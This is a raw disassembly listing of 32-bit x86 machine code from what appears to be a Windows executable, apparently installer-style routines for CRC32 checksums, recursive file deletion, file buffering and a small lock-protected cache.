  406bd1:	68 b0 6c 42 00       	push   $0x426cb0
  406bd6:	ff 15 a0 92 40 00    	call   *0x4092a0
  406bdc:	83 c4 10             	add    $0x10,%esp
  406bdf:	8b d8                	mov    %eax,%ebx
  406be1:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  406be6:	ff b0 28 01 00 00    	push   0x128(%eax)
  406bec:	56                   	push   %esi
  406bed:	e8 ef fc ff ff       	call   0x4068e1
  406bf2:	6a 04                	push   $0x4
  406bf4:	68 00 00 00 c0       	push   $0xc0000000
  406bf9:	56                   	push   %esi
  406bfa:	e8 62 f5 ff ff       	call   0x406161
  406bff:	8b e8                	mov    %eax,%ebp
  406c01:	83 fd ff             	cmp    $0xffffffff,%ebp
  406c04:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406c08:	0f 84 be 00 00 00    	je     0x406ccc
  406c0e:	6a 00                	push   $0x0
  406c10:	55                   	push   %ebp
  406c11:	ff 15 e8 90 40 00    	call   *0x4090e8
  406c17:	8b f8                	mov    %eax,%edi
  406c19:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  406c1d:	50                   	push   %eax
  406c1e:	6a 40                	push   $0x40
  406c20:	ff 15 2c 91 40 00    	call   *0x40912c
  406c26:	8b f0                	mov    %eax,%esi
  406c28:	85 f6                	test   %esi,%esi
  406c2a:	0f 84 95 00 00 00    	je     0x406cc5
  406c30:	57                   	push   %edi
  406c31:	56                   	push   %esi
  406c32:	55                   	push   %ebp
  406c33:	e8 ac f5 ff ff       	call   0x4061e4
  406c38:	85 c0                	test   %eax,%eax
  406c3a:	0f 84 85 00 00 00    	je     0x406cc5
  406c40:	68 c8 99 40 00       	push   $0x4099c8
  406c45:	56                   	push   %esi
  406c46:	e8 76 f4 ff ff       	call   0x4060c1
  406c4b:	85 c0                	test   %eax,%eax
  406c4d:	75 14                	jne    0x406c63
  406c4f:	68 c8 99 40 00       	push   $0x4099c8
  406c54:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406c57:	50                   	push   %eax
  406c58:	ff 15 74 90 40 00    	call   *0x409074
  406c5e:	83 c7 0a             	add    $0xa,%edi
  406c61:	eb 35                	jmp    0x406c98
  406c63:	68 c4 99 40 00       	push   $0x4099c4
  406c68:	83 c0 0a             	add    $0xa,%eax
  406c6b:	50                   	push   %eax
  406c6c:	e8 50 f4 ff ff       	call   0x4060c1
  406c71:	8b e8                	mov    %eax,%ebp
  406c73:	85 ed                	test   %ebp,%ebp
  406c75:	74 1d                	je     0x406c94
  406c77:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406c7a:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  406c7d:	eb 06                	jmp    0x406c85
  406c7f:	8a 11                	mov    (%ecx),%dl
  406c81:	88 10                	mov    %dl,(%eax)
  406c83:	48                   	dec    %eax
  406c84:	49                   	dec    %ecx
  406c85:	3b cd                	cmp    %ebp,%ecx
  406c87:	77 f6                	ja     0x406c7f
  406c89:	2b ee                	sub    %esi,%ebp
  406c8b:	45                   	inc    %ebp
  406c8c:	8b c5                	mov    %ebp,%eax
  406c8e:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406c92:	eb 06                	jmp    0x406c9a
  406c94:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406c98:	8b c7                	mov    %edi,%eax
  406c9a:	53                   	push   %ebx
  406c9b:	68 b0 6c 42 00       	push   $0x426cb0
  406ca0:	03 c6                	add    %esi,%eax
  406ca2:	50                   	push   %eax
  406ca3:	e8 6f f4 ff ff       	call   0x406117
  406ca8:	33 c0                	xor    %eax,%eax
  406caa:	50                   	push   %eax
  406cab:	50                   	push   %eax
  406cac:	50                   	push   %eax
  406cad:	55                   	push   %ebp
  406cae:	ff 15 54 91 40 00    	call   *0x409154
  406cb4:	03 fb                	add    %ebx,%edi
  406cb6:	57                   	push   %edi
  406cb7:	56                   	push   %esi
  406cb8:	55                   	push   %ebp
  406cb9:	e8 55 f5 ff ff       	call   0x406213
  406cbe:	56                   	push   %esi
  406cbf:	ff 15 30 91 40 00    	call   *0x409130
  406cc5:	55                   	push   %ebp
  406cc6:	ff 15 1c 91 40 00    	call   *0x40911c
  406ccc:	5f                   	pop    %edi
  406ccd:	5e                   	pop    %esi
  406cce:	5d                   	pop    %ebp
  406ccf:	5b                   	pop    %ebx
  406cd0:	c3                   	ret
  406cd1:	6a 05                	push   $0x5
  406cd3:	ff 74 24 0c          	push   0xc(%esp)
  406cd7:	ff 74 24 0c          	push   0xc(%esp)
  406cdb:	ff 15 c8 90 40 00    	call   *0x4090c8
  406ce1:	85 c0                	test   %eax,%eax
  406ce3:	75 0f                	jne    0x406cf4
  406ce5:	ff 74 24 08          	push   0x8(%esp)
  406ce9:	ff 74 24 08          	push   0x8(%esp)
  406ced:	e8 65 fe ff ff       	call   0x406b57
  406cf2:	59                   	pop    %ecx
  406cf3:	59                   	pop    %ecx
  406cf4:	ff 05 50 a6 42 00    	incl   0x42a650
  406cfa:	c2 08 00             	ret    $0x8
  406cfd:	55                   	push   %ebp
  406cfe:	8b ec                	mov    %esp,%ebp
  406d00:	81 ec 58 02 00 00    	sub    $0x258,%esp
  406d06:	53                   	push   %ebx
  406d07:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406d0a:	57                   	push   %edi
  406d0b:	8b 7d 08             	mov    0x8(%ebp),%edi
  406d0e:	8b c3                	mov    %ebx,%eax
  406d10:	83 e0 04             	and    $0x4,%eax
  406d13:	57                   	push   %edi
  406d14:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406d17:	e8 3d fb ff ff       	call   0x406859
  406d1c:	f6 c3 08             	test   $0x8,%bl
  406d1f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406d22:	74 17                	je     0x406d3b
  406d24:	57                   	push   %edi
  406d25:	ff 15 64 91 40 00    	call   *0x409164
  406d2b:	f7 d8                	neg    %eax
  406d2d:	1b c0                	sbb    %eax,%eax
  406d2f:	40                   	inc    %eax
  406d30:	01 05 48 a6 42 00    	add    %eax,0x42a648
  406d36:	e9 81 01 00 00       	jmp    0x406ebc
  406d3b:	89 5d 08             	mov    %ebx,0x8(%ebp)
  406d3e:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  406d42:	56                   	push   %esi
  406d43:	74 11                	je     0x406d56
  406d45:	85 c0                	test   %eax,%eax
  406d47:	0f 84 1b 01 00 00    	je     0x406e68
  406d4d:	f6 c3 02             	test   $0x2,%bl
  406d50:	0f 84 12 01 00 00    	je     0x406e68
  406d56:	57                   	push   %edi
  406d57:	be b0 70 42 00       	mov    $0x4270b0,%esi
  406d5c:	56                   	push   %esi
  406d5d:	e8 65 f7 ff ff       	call   0x4064c7
  406d62:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406d66:	8b 1d 88 90 40 00    	mov    0x409088,%ebx
  406d6c:	74 0a                	je     0x406d78
  406d6e:	68 e0 99 40 00       	push   $0x4099e0
  406d73:	56                   	push   %esi
  406d74:	ff d3                	call   *%ebx
  406d76:	eb 06                	jmp    0x406d7e
  406d78:	57                   	push   %edi
  406d79:	e8 69 fa ff ff       	call   0x4067e7
  406d7e:	66 83 3f 00          	cmpw   $0x0,(%edi)
  406d82:	75 0a                	jne    0x406d8e
  406d84:	66 83 3d b0 70 42 00 	cmpw   $0x5c,0x4270b0
  406d8b:	5c 
  406d8c:	75 08                	jne    0x406d96
  406d8e:	68 c8 92 40 00       	push   $0x4092c8
  406d93:	57                   	push   %edi
  406d94:	ff d3                	call   *%ebx
  406d96:	57                   	push   %edi
  406d97:	ff 15 bc 90 40 00    	call   *0x4090bc
  406d9d:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  406da0:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  406da6:	50                   	push   %eax
  406da7:	56                   	push   %esi
  406da8:	ff 15 60 91 40 00    	call   *0x409160
  406dae:	8b f0                	mov    %eax,%esi
  406db0:	83 fe ff             	cmp    $0xffffffff,%esi
  406db3:	0f 84 a4 00 00 00    	je     0x406e5d
  406db9:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  406dc0:	2e 
  406dc1:	75 1e                	jne    0x406de1
  406dc3:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  406dca:	00 
  406dcb:	74 73                	je     0x406e40
  406dcd:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  406dd4:	2e 
  406dd5:	75 0a                	jne    0x406de1
  406dd7:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  406dde:	00 
  406ddf:	74 5f                	je     0x406e40
  406de1:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  406de7:	50                   	push   %eax
  406de8:	53                   	push   %ebx
  406de9:	e8 d9 f6 ff ff       	call   0x4064c7
  406dee:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  406df5:	74 15                	je     0x406e0c
  406df7:	8b 45 0c             	mov    0xc(%ebp),%eax
  406dfa:	83 e0 03             	and    $0x3,%eax
  406dfd:	3c 03                	cmp    $0x3,%al
  406dff:	75 3f                	jne    0x406e40
  406e01:	ff 75 0c             	push   0xc(%ebp)
  406e04:	57                   	push   %edi
  406e05:	e8 f3 fe ff ff       	call   0x406cfd
  406e0a:	eb 34                	jmp    0x406e40
  406e0c:	ff 75 fc             	push   -0x4(%ebp)
  406e0f:	57                   	push   %edi
  406e10:	e8 5b f9 ff ff       	call   0x406770
  406e15:	85 c0                	test   %eax,%eax
  406e17:	75 1f                	jne    0x406e38
  406e19:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  406e1c:	74 12                	je     0x406e30
  406e1e:	57                   	push   %edi
  406e1f:	6a f1                	push   $0xfffffff1
  406e21:	e8 18 e4 ff ff       	call   0x40523e
  406e26:	6a 00                	push   $0x0
  406e28:	57                   	push   %edi
  406e29:	e8 a3 fe ff ff       	call   0x406cd1
  406e2e:	eb 10                	jmp    0x406e40
  406e30:	ff 05 48 a6 42 00    	incl   0x42a648
  406e36:	eb 08                	jmp    0x406e40
  406e38:	57                   	push   %edi
  406e39:	6a f2                	push   $0xfffffff2
  406e3b:	e8 fe e3 ff ff       	call   0x40523e
  406e40:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  406e46:	50                   	push   %eax
  406e47:	56                   	push   %esi
  406e48:	ff 15 5c 91 40 00    	call   *0x40915c
  406e4e:	85 c0                	test   %eax,%eax
  406e50:	0f 85 63 ff ff ff    	jne    0x406db9
  406e56:	56                   	push   %esi
  406e57:	ff 15 58 91 40 00    	call   *0x409158
  406e5d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406e61:	74 05                	je     0x406e68
  406e63:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  406e68:	33 f6                	xor    %esi,%esi
  406e6a:	39 75 08             	cmp    %esi,0x8(%ebp)
  406e6d:	74 4c                	je     0x406ebb
  406e6f:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  406e72:	74 37                	je     0x406eab
  406e74:	57                   	push   %edi
  406e75:	e8 39 f7 ff ff       	call   0x4065b3
  406e7a:	85 c0                	test   %eax,%eax
  406e7c:	74 3d                	je     0x406ebb
  406e7e:	57                   	push   %edi
  406e7f:	e8 34 f9 ff ff       	call   0x4067b8
  406e84:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e87:	83 c8 01             	or     $0x1,%eax
  406e8a:	50                   	push   %eax
  406e8b:	57                   	push   %edi
  406e8c:	e8 df f8 ff ff       	call   0x406770
  406e91:	85 c0                	test   %eax,%eax
  406e93:	75 1e                	jne    0x406eb3
  406e95:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  406e98:	74 11                	je     0x406eab
  406e9a:	57                   	push   %edi
  406e9b:	6a f1                	push   $0xfffffff1
  406e9d:	e8 9c e3 ff ff       	call   0x40523e
  406ea2:	56                   	push   %esi
  406ea3:	57                   	push   %edi
  406ea4:	e8 28 fe ff ff       	call   0x406cd1
  406ea9:	eb 10                	jmp    0x406ebb
  406eab:	ff 05 48 a6 42 00    	incl   0x42a648
  406eb1:	eb 08                	jmp    0x406ebb
  406eb3:	57                   	push   %edi
  406eb4:	6a e5                	push   $0xffffffe5
  406eb6:	e8 83 e3 ff ff       	call   0x40523e
  406ebb:	5e                   	pop    %esi
  406ebc:	5f                   	pop    %edi
  406ebd:	5b                   	pop    %ebx
  406ebe:	c9                   	leave
  406ebf:	c2 08 00             	ret    $0x8
  406ec2:	55                   	push   %ebp
  406ec3:	8b ec                	mov    %esp,%ebp
  406ec5:	83 3d b4 80 42 00 00 	cmpl   $0x0,0x4280b4
  406ecc:	75 2f                	jne    0x406efd
  406ece:	33 c9                	xor    %ecx,%ecx
  406ed0:	56                   	push   %esi
  406ed1:	6a 08                	push   $0x8
  406ed3:	8b c1                	mov    %ecx,%eax
  406ed5:	5e                   	pop    %esi
  406ed6:	8b d0                	mov    %eax,%edx
  406ed8:	80 e2 01             	and    $0x1,%dl
  406edb:	f6 da                	neg    %dl
  406edd:	1b d2                	sbb    %edx,%edx
  406edf:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406ee5:	d1 e8                	shr    $1,%eax
  406ee7:	33 c2                	xor    %edx,%eax
  406ee9:	4e                   	dec    %esi
  406eea:	75 ea                	jne    0x406ed6
  406eec:	89 04 8d b0 80 42 00 	mov    %eax,0x4280b0(,%ecx,4)
  406ef3:	41                   	inc    %ecx
  406ef4:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406efa:	7c d5                	jl     0x406ed1
  406efc:	5e                   	pop    %esi
  406efd:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406f01:	8b 45 08             	mov    0x8(%ebp),%eax
  406f04:	f7 d0                	not    %eax
  406f06:	76 22                	jbe    0x406f2a
  406f08:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406f0b:	0f b6 11             	movzbl (%ecx),%edx
  406f0e:	ff 4d 10             	decl   0x10(%ebp)
  406f11:	33 d0                	xor    %eax,%edx
  406f13:	81 e2 ff 00 00 00    	and    $0xff,%edx
  406f19:	c1 e8 08             	shr    $0x8,%eax
  406f1c:	33 04 95 b0 80 42 00 	xor    0x4280b0(,%edx,4),%eax
  406f23:	41                   	inc    %ecx
  406f24:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406f28:	77 e1                	ja     0x406f0b
  406f2a:	f7 d0                	not    %eax
  406f2c:	5d                   	pop    %ebp
  406f2d:	c2 0c 00             	ret    $0xc
  406f30:	8b 54 24 04          	mov    0x4(%esp),%edx
  406f34:	8b 0a                	mov    (%edx),%ecx
  406f36:	33 c0                	xor    %eax,%eax
  406f38:	83 c2 20             	add    $0x20,%edx
  406f3b:	eb 03                	jmp    0x406f40
  406f3d:	8b 09                	mov    (%ecx),%ecx
  406f3f:	40                   	inc    %eax
  406f40:	3b ca                	cmp    %edx,%ecx
  406f42:	75 f9                	jne    0x406f3d
  406f44:	c3                   	ret
  406f45:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406f49:	8b 01                	mov    (%ecx),%eax
  406f4b:	83 c1 20             	add    $0x20,%ecx
  406f4e:	eb 14                	jmp    0x406f64
  406f50:	8b 50 10             	mov    0x10(%eax),%edx
  406f53:	3b 54 24 04          	cmp    0x4(%esp),%edx
  406f57:	75 09                	jne    0x406f62
  406f59:	8b 50 14             	mov    0x14(%eax),%edx
  406f5c:	3b 54 24 08          	cmp    0x8(%esp),%edx
  406f60:	74 06                	je     0x406f68
  406f62:	8b 00                	mov    (%eax),%eax
  406f64:	3b c1                	cmp    %ecx,%eax
  406f66:	75 e8                	jne    0x406f50
  406f68:	3b c1                	cmp    %ecx,%eax
  406f6a:	74 04                	je     0x406f70
  406f6c:	85 c0                	test   %eax,%eax
  406f6e:	75 02                	jne    0x406f72
  406f70:	33 c0                	xor    %eax,%eax
  406f72:	c3                   	ret
  406f73:	55                   	push   %ebp
  406f74:	8b ec                	mov    %esp,%ebp
  406f76:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406f7a:	53                   	push   %ebx
  406f7b:	56                   	push   %esi
  406f7c:	57                   	push   %edi
  406f7d:	74 74                	je     0x406ff3
  406f7f:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406f83:	74 6e                	je     0x406ff3
  406f85:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  406f88:	85 db                	test   %ebx,%ebx
  406f8a:	74 67                	je     0x406ff3
  406f8c:	8b 3d 2c 91 40 00    	mov    0x40912c,%edi
  406f92:	6a 20                	push   $0x20
  406f94:	6a 40                	push   $0x40
  406f96:	ff d7                	call   *%edi
  406f98:	8b f0                	mov    %eax,%esi
  406f9a:	85 f6                	test   %esi,%esi
  406f9c:	74 55                	je     0x406ff3
  406f9e:	ff 75 0c             	push   0xc(%ebp)
  406fa1:	6a 40                	push   $0x40
  406fa3:	ff d7                	call   *%edi
  406fa5:	85 c0                	test   %eax,%eax
  406fa7:	89 46 08             	mov    %eax,0x8(%esi)
  406faa:	74 47                	je     0x406ff3
  406fac:	8b 45 10             	mov    0x10(%ebp),%eax
  406faf:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406fb2:	89 46 10             	mov    %eax,0x10(%esi)
  406fb5:	8b 45 14             	mov    0x14(%ebp),%eax
  406fb8:	89 46 14             	mov    %eax,0x14(%esi)
  406fbb:	33 c0                	xor    %eax,%eax
  406fbd:	85 ff                	test   %edi,%edi
  406fbf:	76 11                	jbe    0x406fd2
  406fc1:	8b 55 08             	mov    0x8(%ebp),%edx
  406fc4:	8a 14 10             	mov    (%eax,%edx,1),%dl
  406fc7:	8b 4e 08             	mov    0x8(%esi),%ecx
  406fca:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  406fcd:	40                   	inc    %eax
  406fce:	3b c7                	cmp    %edi,%eax
  406fd0:	72 ef                	jb     0x406fc1
  406fd2:	8b 45 18             	mov    0x18(%ebp),%eax
  406fd5:	89 46 18             	mov    %eax,0x18(%esi)
  406fd8:	89 7e 0c             	mov    %edi,0xc(%esi)
  406fdb:	8d 43 20             	lea    0x20(%ebx),%eax
  406fde:	89 06                	mov    %eax,(%esi)
  406fe0:	8b 43 24             	mov    0x24(%ebx),%eax
  406fe3:	89 46 04             	mov    %eax,0x4(%esi)
  406fe6:	8b 43 24             	mov    0x24(%ebx),%eax
  406fe9:	89 30                	mov    %esi,(%eax)
  406feb:	33 c0                	xor    %eax,%eax
  406fed:	89 73 24             	mov    %esi,0x24(%ebx)
  406ff0:	40                   	inc    %eax
  406ff1:	eb 02                	jmp    0x406ff5
  406ff3:	33 c0                	xor    %eax,%eax
  406ff5:	5f                   	pop    %edi
  406ff6:	5e                   	pop    %esi
  406ff7:	5b                   	pop    %ebx
  406ff8:	5d                   	pop    %ebp
  406ff9:	c3                   	ret
  406ffa:	56                   	push   %esi
  406ffb:	8b 74 24 08          	mov    0x8(%esp),%esi
  406fff:	85 f6                	test   %esi,%esi
  407001:	74 24                	je     0x407027
  407003:	8b 46 08             	mov    0x8(%esi),%eax
  407006:	85 c0                	test   %eax,%eax
  407008:	57                   	push   %edi
  407009:	8b 3d 30 91 40 00    	mov    0x409130,%edi
  40700f:	74 03                	je     0x407014
  407011:	50                   	push   %eax
  407012:	ff d7                	call   *%edi
  407014:	8b 46 04             	mov    0x4(%esi),%eax
  407017:	8b 0e                	mov    (%esi),%ecx
  407019:	89 08                	mov    %ecx,(%eax)
  40701b:	8b 06                	mov    (%esi),%eax
  40701d:	8b 4e 04             	mov    0x4(%esi),%ecx
  407020:	56                   	push   %esi
  407021:	89 48 04             	mov    %ecx,0x4(%eax)
  407024:	ff d7                	call   *%edi
  407026:	5f                   	pop    %edi
  407027:	5e                   	pop    %esi
  407028:	c3                   	ret
  407029:	56                   	push   %esi
  40702a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40702e:	8b 06                	mov    (%esi),%eax
  407030:	85 c0                	test   %eax,%eax
  407032:	74 14                	je     0x407048
  407034:	57                   	push   %edi
  407035:	8d 7e 20             	lea    0x20(%esi),%edi
  407038:	eb 09                	jmp    0x407043
  40703a:	50                   	push   %eax
  40703b:	e8 ba ff ff ff       	call   0x406ffa
  407040:	8b 06                	mov    (%esi),%eax
  407042:	59                   	pop    %ecx
  407043:	3b c7                	cmp    %edi,%eax
  407045:	75 f3                	jne    0x40703a
  407047:	5f                   	pop    %edi
  407048:	5e                   	pop    %esi
  407049:	c3                   	ret
  40704a:	55                   	push   %ebp
  40704b:	8b ec                	mov    %esp,%ebp
  40704d:	57                   	push   %edi
  40704e:	ff 75 18             	push   0x18(%ebp)
  407051:	ff 75 10             	push   0x10(%ebp)
  407054:	ff 75 0c             	push   0xc(%ebp)
  407057:	e8 e9 fe ff ff       	call   0x406f45
  40705c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40705f:	83 c4 0c             	add    $0xc,%esp
  407062:	85 ff                	test   %edi,%edi
  407064:	74 35                	je     0x40709b
  407066:	85 c0                	test   %eax,%eax
  407068:	74 31                	je     0x40709b
  40706a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40706d:	85 c9                	test   %ecx,%ecx
  40706f:	74 05                	je     0x407076
  407071:	8b 50 18             	mov    0x18(%eax),%edx
  407074:	89 11                	mov    %edx,(%ecx)
  407076:	8b 48 0c             	mov    0xc(%eax),%ecx
  407079:	56                   	push   %esi
  40707a:	33 f6                	xor    %esi,%esi
  40707c:	85 c9                	test   %ecx,%ecx
  40707e:	76 0e                	jbe    0x40708e
  407080:	8b 50 08             	mov    0x8(%eax),%edx
  407083:	8a 14 16             	mov    (%esi,%edx,1),%dl
  407086:	88 14 3e             	mov    %dl,(%esi,%edi,1)
  407089:	46                   	inc    %esi
  40708a:	3b f1                	cmp    %ecx,%esi
  40708c:	72 f2                	jb     0x407080
  40708e:	50                   	push   %eax
  40708f:	e8 66 ff ff ff       	call   0x406ffa
  407094:	59                   	pop    %ecx
  407095:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  407098:	5e                   	pop    %esi
  407099:	eb 02                	jmp    0x40709d
  40709b:	33 c0                	xor    %eax,%eax
  40709d:	5f                   	pop    %edi
  40709e:	5d                   	pop    %ebp
  40709f:	c3                   	ret
  4070a0:	83 25 c4 84 42 00 00 	andl   $0x0,0x4284c4
  4070a7:	83 25 e0 84 42 00 00 	andl   $0x0,0x4284e0
  4070ae:	68 00 85 42 00       	push   $0x428500
  4070b3:	c7 05 c0 84 42 00 e0 	movl   $0x4284e0,0x4284c0
  4070ba:	84 42 00 
  4070bd:	c7 05 e4 84 42 00 c0 	movl   $0x4284c0,0x4284e4
  4070c4:	84 42 00 
  4070c7:	ff 15 6c 91 40 00    	call   *0x40916c
  4070cd:	33 c0                	xor    %eax,%eax
  4070cf:	40                   	inc    %eax
  4070d0:	c3                   	ret
  4070d1:	68 c0 84 42 00       	push   $0x4284c0
  4070d6:	e8 4e ff ff ff       	call   0x407029
  4070db:	c7 04 24 00 85 42 00 	movl   $0x428500,(%esp)
  4070e2:	ff 15 70 91 40 00    	call   *0x409170
  4070e8:	c3                   	ret
  4070e9:	56                   	push   %esi
  4070ea:	57                   	push   %edi
  4070eb:	be 00 85 42 00       	mov    $0x428500,%esi
  4070f0:	56                   	push   %esi
  4070f1:	ff 15 78 91 40 00    	call   *0x409178
  4070f7:	68 c0 84 42 00       	push   $0x4284c0
  4070fc:	e8 2f fe ff ff       	call   0x406f30
  407101:	59                   	pop    %ecx
  407102:	56                   	push   %esi
  407103:	8b f8                	mov    %eax,%edi
  407105:	ff 15 74 91 40 00    	call   *0x409174
  40710b:	8b c7                	mov    %edi,%eax
  40710d:	5f                   	pop    %edi
  40710e:	5e                   	pop    %esi
  40710f:	c3                   	ret
  407110:	56                   	push   %esi
  407111:	57                   	push   %edi
  407112:	bf 00 85 42 00       	mov    $0x428500,%edi
  407117:	57                   	push   %edi
  407118:	ff 15 78 91 40 00    	call   *0x409178
  40711e:	68 c0 84 42 00       	push   $0x4284c0
  407123:	ff 74 24 14          	push   0x14(%esp)
  407127:	ff 74 24 14          	push   0x14(%esp)
  40712b:	e8 15 fe ff ff       	call   0x406f45
  407130:	83 c4 0c             	add    $0xc,%esp
  407133:	8b f0                	mov    %eax,%esi
  407135:	f7 de                	neg    %esi
  407137:	1b f6                	sbb    %esi,%esi
  407139:	57                   	push   %edi
  40713a:	f7 de                	neg    %esi
  40713c:	ff 15 74 91 40 00    	call   *0x409174
  407142:	5f                   	pop    %edi
  407143:	8b c6                	mov    %esi,%eax
  407145:	5e                   	pop    %esi
  407146:	c3                   	ret
  407147:	55                   	push   %ebp
  407148:	8b ec                	mov    %esp,%ebp
  40714a:	56                   	push   %esi
  40714b:	57                   	push   %edi
  40714c:	8b 3d 2c 91 40 00    	mov    0x40912c,%edi
  407152:	6a 30                	push   $0x30
  407154:	6a 40                	push   $0x40
  407156:	ff d7                	call   *%edi
  407158:	8b f0                	mov    %eax,%esi
  40715a:	85 f6                	test   %esi,%esi
  40715c:	74 64                	je     0x4071c2
  40715e:	53                   	push   %ebx
  40715f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  407162:	b8 33 37 23 00       	mov    $0x233733,%eax
  407167:	3b d8                	cmp    %eax,%ebx
  407169:	77 54                	ja     0x4071bf
  40716b:	39 45 10             	cmp    %eax,0x10(%ebp)
  40716e:	77 4f                	ja     0x4071bf
  407170:	53                   	push   %ebx
  407171:	6a 40                	push   $0x40
  407173:	ff d7                	call   *%edi
  407175:	ff 75 10             	push   0x10(%ebp)
  407178:	89 06                	mov    %eax,(%esi)
  40717a:	6a 40                	push   $0x40
  40717c:	ff d7                	call   *%edi
  40717e:	83 3e 00             	cmpl   $0x0,(%esi)
  407181:	89 46 04             	mov    %eax,0x4(%esi)
  407184:	74 39                	je     0x4071bf
  407186:	85 c0                	test   %eax,%eax
  407188:	74 35                	je     0x4071bf
  40718a:	33 c0                	xor    %eax,%eax
  40718c:	85 db                	test   %ebx,%ebx
  40718e:	76 10                	jbe    0x4071a0
  407190:	8b 55 08             	mov    0x8(%ebp),%edx
  407193:	8a 14 10             	mov    (%eax,%edx,1),%dl
  407196:	8b 0e                	mov    (%esi),%ecx
  407198:	88 14 08             	mov    %dl,(%eax,%ecx,1)
  40719b:	40                   	inc    %eax
  40719c:	3b c3                	cmp    %ebx,%eax
  40719e:	72 f0                	jb     0x407190
  4071a0:	8b 45 10             	mov    0x10(%ebp),%eax
  4071a3:	89 46 0c             	mov    %eax,0xc(%esi)
  4071a6:	8b 45 14             	mov    0x14(%ebp),%eax
  4071a9:	89 46 10             	mov    %eax,0x10(%esi)
  4071ac:	8b 45 18             	mov    0x18(%ebp),%eax
  4071af:	89 46 14             	mov    %eax,0x14(%esi)
  4071b2:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4071b5:	89 46 1c             	mov    %eax,0x1c(%esi)
  4071b8:	89 5e 08             	mov    %ebx,0x8(%esi)
  4071bb:	8b c6                	mov    %esi,%eax
  4071bd:	eb 02                	jmp    0x4071c1
  4071bf:	33 c0                	xor    %eax,%eax
  4071c1:	5b                   	pop    %ebx
  4071c2:	5f                   	pop    %edi
  4071c3:	5e                   	pop    %esi
  4071c4:	5d                   	pop    %ebp
  4071c5:	c3                   	ret
  4071c6:	53                   	push   %ebx
  4071c7:	55                   	push   %ebp
  4071c8:	56                   	push   %esi
  4071c9:	57                   	push   %edi
  4071ca:	bb 00 85 42 00       	mov    $0x428500,%ebx
  4071cf:	53                   	push   %ebx
  4071d0:	ff 15 78 91 40 00    	call   *0x409178
  4071d6:	8b 74 24 14          	mov    0x14(%esp),%esi
  4071da:	68 c0 84 42 00       	push   $0x4284c0
  4071df:	ff 76 18             	push   0x18(%esi)
  4071e2:	ff 76 14             	push   0x14(%esi)
  4071e5:	ff 76 10             	push   0x10(%esi)
  4071e8:	ff 76 0c             	push   0xc(%esi)
  4071eb:	ff 76 04             	push   0x4(%esi)
  4071ee:	e8 80 fd ff ff       	call   0x406f73
  4071f3:	8b 3d 30 91 40 00    	mov    0x409130,%edi
  4071f9:	83 c4 18             	add    $0x18,%esp
  4071fc:	ff 36                	push   (%esi)
  4071fe:	8b e8                	mov    %eax,%ebp
  407200:	ff d7                	call   *%edi
  407202:	ff 76 04             	push   0x4(%esi)
  407205:	ff d7                	call   *%edi
  407207:	53                   	push   %ebx
  407208:	ff 15 74 91 40 00    	call   *0x409174
  40720e:	5f                   	pop    %edi
  40720f:	5e                   	pop    %esi
  407210:	8b c5                	mov    %ebp,%eax
  407212:	5d                   	pop    %ebp
  407213:	5b                   	pop    %ebx
  407214:	c3                   	ret
  407215:	55                   	push   %ebp
  407216:	8b ec                	mov    %esp,%ebp
  407218:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40721c:	75 04                	jne    0x407222
  40721e:	33 c0                	xor    %eax,%eax
  407220:	5d                   	pop    %ebp
  407221:	c3                   	ret
  407222:	56                   	push   %esi
  407223:	57                   	push   %edi
  407224:	bf 00 85 42 00       	mov    $0x428500,%edi
  407229:	57                   	push   %edi
  40722a:	ff 15 78 91 40 00    	call   *0x409178
  407230:	be c0 84 42 00       	mov    $0x4284c0,%esi
  407235:	56                   	push   %esi
  407236:	ff 75 10             	push   0x10(%ebp)
  407239:	ff 75 0c             	push   0xc(%ebp)
  40723c:	e8 04 fd ff ff       	call   0x406f45
  407241:	83 c4 0c             	add    $0xc,%esp
  407244:	85 c0                	test   %eax,%eax
  407246:	75 0f                	jne    0x407257
  407248:	33 f6                	xor    %esi,%esi
  40724a:	57                   	push   %edi
  40724b:	ff 15 74 91 40 00    	call   *0x409174
